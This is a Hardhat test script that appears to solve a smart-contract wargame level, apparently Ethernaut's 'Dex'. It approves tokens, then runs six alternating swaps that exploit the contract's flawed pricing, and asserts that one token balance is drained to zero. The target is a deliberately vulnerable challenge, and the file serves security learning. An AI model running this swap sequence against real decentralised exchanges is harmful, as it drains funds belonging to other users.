const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x964cc88F1551538397CFA78090f0697FC1874683"

describe("22 Dex", function () {
    let player, challengeContract, token1, token2

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Dex",
            CONTRACT_ADDRESS,
            player
        )
        token1 = await challengeContract.token1()
        token2 = await challengeContract.token2()
        const token1BalanceBefore = await challengeContract.balanceOf(
            token1,
            challengeContract.address
        )
        const token2BalanceBefore = await challengeContract.balanceOf(
            token2,
            challengeContract.address
        )
        assert(
            token1BalanceBefore.toString() != "0" &&
                token2BalanceBefore.toString() != "0"
        )
    })

    it("Execution", async function () {
        let txResponse = await challengeContract.approve(
            challengeContract.address,
            1000
        )
        await txResponse.wait(1)

        txResponse = await challengeContract.swap(token1, token2, 10, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(token2, token1, 20, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(token1, token2, 24, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(token2, token1, 30, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(token1, token2, 41, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
        txResponse = await challengeContract.swap(token2, token1, 45, {
            gasLimit: 500_000,
        })
        await txResponse.wait(1)
    }).timeout(1_000_000)

    after(async function () {
        const token1BalanceAfter = await challengeContract.balanceOf(
            token1,
            challengeContract.address
        )
        const token2BalanceAfter = await challengeContract.balanceOf(
            token2,
            challengeContract.address
        )
        assert(
            token1BalanceAfter.toString() == "0" ||
                token2BalanceAfter.toString() == "0"
        )
    })
})
